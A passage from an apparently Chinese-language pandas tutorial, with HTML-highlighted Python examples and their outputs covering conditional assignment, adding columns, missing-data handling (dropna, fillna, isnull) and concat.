class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"A列大于4的数据都变为0"</span>)</span></span></span><br><span class="line">df<span class="selector-class">.A</span>[df.A&gt;<span class="number">4</span>] = <span class="number">0</span> #A列大于<span class="number">4</span>的所有数据都变为<span class="number">0</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">A列大于<span class="number">4</span>的数据都变为<span class="number">0</span></span><br><span class="line">            A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>  <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>  <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>  <span class="number">0</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">0</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">0</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">0</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br></pre></td></tr></table></figure><br>注意这两个所选取的范围不同 变化也会不同</p>
<p>还可以新增一列<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"定义一个新的列F 值都为NAN"</span>)</span></span></span><br><span class="line">df[<span class="string">'F'</span>] = np<span class="selector-class">.nan</span> #定义一个新的列F 值都为NAN</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"设置一个新列E 行的标签要保持一致 赋值"</span>)</span></span></span><br><span class="line">df[<span class="string">'E'</span>] = pd.Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],index=pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)) #设置一个新列E 行的标签要保持一致 赋值</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A   B   C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span></span><br><span class="line">定义一个新的列F 值都为NAN</span><br><span class="line">             A   B   C   D   F</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span> NaN</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span> NaN</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span> NaN</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span> NaN</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span> NaN</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span> NaN</span><br><span class="line">设置一个新列E 行的标签要保持一致 赋值</span><br><span class="line">             A   B   C   D   F  E</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">1</span>   <span class="number">2</span>   <span class="number">3</span> NaN  <span class="number">1</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5</span>   <span class="number">6</span>   <span class="number">7</span> NaN  <span class="number">2</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9</span>  <span class="number">10</span>  <span class="number">11</span> NaN  <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13</span>  <span class="number">14</span>  <span class="number">15</span> NaN  <span class="number">4</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17</span>  <span class="number">18</span>  <span class="number">19</span> NaN  <span class="number">5</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21</span>  <span class="number">22</span>  <span class="number">23</span> NaN  <span class="number">6</span></span><br></pre></td></tr></table></figure></p>
<h1 id="导入导出数据"><a href="#导入导出数据" class="headerlink" title="导入导出数据"></a>导入导出数据</h1><p>导入导出数据有很多 直接参考网站 都差不多</p>
<p><a href="https://www.pypandas.cn/docs/user_guide/io.html#csv-%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">pandas_I/O</a></p>
<h1 id="处理丢失数据"><a href="#处理丢失数据" class="headerlink" title="处理丢失数据"></a>处理丢失数据</h1><h2 id="dropna-丢弃"><a href="#dropna-丢弃" class="headerlink" title="dropna 丢弃"></a>dropna 丢弃</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">0</span>,<span class="number">1</span>] = np<span class="selector-class">.nan</span> #<span class="number">0</span>行<span class="number">1</span>列数据为空</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">1</span>,<span class="number">2</span>] = np.nan</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"丢掉行 1丢掉列  how=&#123;'any','all'&#125; 该行有nan就丢掉"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df.dropna(axis=<span class="number">0</span>,how=<span class="string">'any'</span>)</span></span>) #丢掉行 <span class="number">1</span>丢掉列  how=&#123;<span class="string">'any'</span>,<span class="string">'all'</span>&#125; 该行有nan就丢掉</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"丢掉行 1丢掉列  how=&#123;'any','all'&#125; 只有该行所有数都为nan才丢掉"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df.dropna(axis=<span class="number">0</span>,how=<span class="string">'all'</span>)</span></span>) #丢掉行 <span class="number">1</span>丢掉列  how=&#123;<span class="string">'any'</span>,<span class="string">'all'</span>&#125; 只有该行所有数都为nan才丢掉</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A     B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   NaN   <span class="number">2.0</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5.0</span>   NaN   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br><span class="line">丢掉行 <span class="number">1</span>丢掉列  how=&#123;<span class="string">'any'</span>,<span class="string">'all'</span>&#125; 该行有nan就丢掉</span><br><span class="line">             A     B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br><span class="line">丢掉行 <span class="number">1</span>丢掉列  how=&#123;<span class="string">'any'</span>,<span class="string">'all'</span>&#125; 只有该行所有数都为nan才丢掉</span><br><span class="line">             A     B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   NaN   <span class="number">2.0</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5.0</span>   NaN   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="fillna-指定填充"><a href="#fillna-指定填充" class="headerlink" title="fillna 指定填充"></a>fillna 指定填充</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">0</span>,<span class="number">1</span>] = np<span class="selector-class">.nan</span> #<span class="number">0</span>行<span class="number">1</span>列数据为空</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">1</span>,<span class="number">2</span>] = np.nan</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"将丢失的数据变为0"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df.fillna(value=<span class="number">0</span>)</span></span>)  #将丢失的数据变为<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df数据</span><br><span class="line">             A     B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   NaN   <span class="number">2.0</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5.0</span>   NaN   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br><span class="line">将丢失的数据变为<span class="number">0</span></span><br><span class="line">             A     B     C   D</span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="number">0.0</span>   <span class="number">2.0</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5.0</span>   <span class="number">0.0</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<h2 id="isnull-判断缺失"><a href="#isnull-判断缺失" class="headerlink" title="isnull 判断缺失"></a>isnull 判断缺失</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">0</span>,<span class="number">1</span>] = np<span class="selector-class">.nan</span> #<span class="number">0</span>行<span class="number">1</span>列数据为空</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">1</span>,<span class="number">2</span>] = np.nan</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"是否有缺失  缺失为True 不缺失为False"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df.isnull()</span></span>) #是否有缺失  缺失为True 不缺失为False</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">df数据</span></span><br><span class="line">             <span class="string">A</span>     <span class="string">B</span>     <span class="string">C</span>   <span class="string">D</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="string">NaN</span>   <span class="number">2.0</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5.0</span>   <span class="string">NaN</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br><span class="line"><span class="string">是否有缺失</span>  <span class="string">缺失为True</span> <span class="string">不缺失为False</span></span><br><span class="line">                <span class="string">A</span>      <span class="string">B</span>      <span class="string">C</span>      <span class="string">D</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>  <span class="literal">False</span>   <span class="literal">True</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>  <span class="literal">False</span>  <span class="literal">False</span>   <span class="literal">True</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dates = pd.date_range(<span class="string">'20130101'</span>,periods=<span class="number">6</span>)</span><br><span class="line">df = pd.DataFrame(np.arange(<span class="number">24</span>).reshape((<span class="number">6</span>,<span class="number">4</span>)),index=dates,<span class="attribute">columns</span>=[<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>])</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">0</span>,<span class="number">1</span>] = np<span class="selector-class">.nan</span> #<span class="number">0</span>行<span class="number">1</span>列数据为空</span><br><span class="line">df<span class="selector-class">.iloc</span>[<span class="number">1</span>,<span class="number">2</span>] = np.nan</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"df数据"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(df)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">"至少有一个为True 就意味着至少丢失了一个数据 True丢失了 False没有丢失"</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(np.any(df.isnull()</span></span>)==True) #至少有一个为True 就意味着至少丢失了一个数据 True丢失了 False没有丢失</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">df数据</span></span><br><span class="line">             <span class="string">A</span>     <span class="string">B</span>     <span class="string">C</span>   <span class="string">D</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-01</span>   <span class="number">0</span>   <span class="string">NaN</span>   <span class="number">2.0</span>   <span class="number">3</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-02</span>   <span class="number">4</span>   <span class="number">5.0</span>   <span class="string">NaN</span>   <span class="number">7</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-03</span>   <span class="number">8</span>   <span class="number">9.0</span>  <span class="number">10.0</span>  <span class="number">11</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-04</span>  <span class="number">12</span>  <span class="number">13.0</span>  <span class="number">14.0</span>  <span class="number">15</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-05</span>  <span class="number">16</span>  <span class="number">17.0</span>  <span class="number">18.0</span>  <span class="number">19</span></span><br><span class="line"><span class="number">2013</span><span class="number">-01</span><span class="number">-06</span>  <span class="number">20</span>  <span class="number">21.0</span>  <span class="number">22.0</span>  <span class="number">23</span></span><br><span class="line"><span class="string">至少有一个为True</span> <span class="string">就意味着至少丢失了一个数据</span> <span class="literal">True</span><span class="string">丢失了</span> <span class="literal">False</span><span class="string">没有丢失</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></p>
<h1 id="concat合并"><a href="#concat合并" class="headerlink" title="concat合并"></a>concat合并</h1><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># concatenating</span></span><br><span class="line">df1 = pd.DataFrame(np.ones((3,4))<span class="number">*0</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df2 = pd.DataFrame(np.ones((3,4))<span class="number">*1</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line">df3 = pd.DataFrame(np.ones((3,4))<span class="number">*2</span>,columns=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>])</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df1"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df1)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df2"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df2)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"df3"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(df3)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"res"</span>)</span><br><span class="line">res = pd.concat([df1,df2,df3],<span class="attribute">axis</span>=1,ignore_index=True) #水平合并df1 df2 df3 0为垂直合并 <span class="attribute">ignore_index</span>=<span class="literal">True</span> 就是忽略之前的标签 重新开始排序</span><br><span class="line"><span class="builtin-name">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">df1</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span></span><br><span class="line">df2</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span></span><br><span class="line">df3</span><br><span class="line">     a    b    c    d</span><br><span class="line"><span class="number">0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line">res</span><br><span class="line">    <span class="number">0</span>    <span class="number">1</span>    <span class="number">2</span>    <span class="number">3</span>    <span class="number">4</span>    <span class="number">5</span>    <span class="number">6</span>    <span class="number">7</span>    <span class="number">8</span>    <span class="number">9</span>    <span class="number">10</span>   <span class="number">11</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">1</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br><span class="line"><span class="number">2</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">0.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">1.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span>  <span class="number">2.0</span></span><br></pre></td></tr></table></figure></p>
